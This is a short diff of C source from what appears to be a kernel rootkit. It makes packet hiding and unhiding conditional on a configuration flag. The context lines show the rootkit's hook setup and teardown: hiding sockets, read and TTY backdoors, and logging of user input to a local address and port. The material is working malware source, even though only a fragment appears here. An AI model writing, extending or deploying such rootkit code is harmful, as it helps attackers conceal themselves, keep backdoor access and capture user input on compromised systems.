@@ -88,6 +88,9 @@ init_hooks(void)
     if (rootkit.hiding_sockets)
         hide_sockets();
 
+    if (rootkit.hiding_packets)
+        hide_packets();
+
     if (rootkit.backdoor == BD_READ)
         backdoor_read();
     else if (rootkit.backdoor == BD_TTY)
@@ -95,8 +98,6 @@ init_hooks(void)
 
     if (rootkit.logging_input)
         log_input("127.0.0.1", "5000");
-
-    hide_packets();
 }
 
 void
@@ -119,13 +120,14 @@ remove_hooks(void)
     if (rootkit.hiding_sockets)
         unhide_sockets();
 
+    if (rootkit.hiding_packets)
+        unhide_packets();
+
     if (rootkit.backdoor != BD_OFF)
         unbackdoor();
 
     if (rootkit.logging_input)
         unlog_input();
-
-    unhide_packets();
 }
 
 void
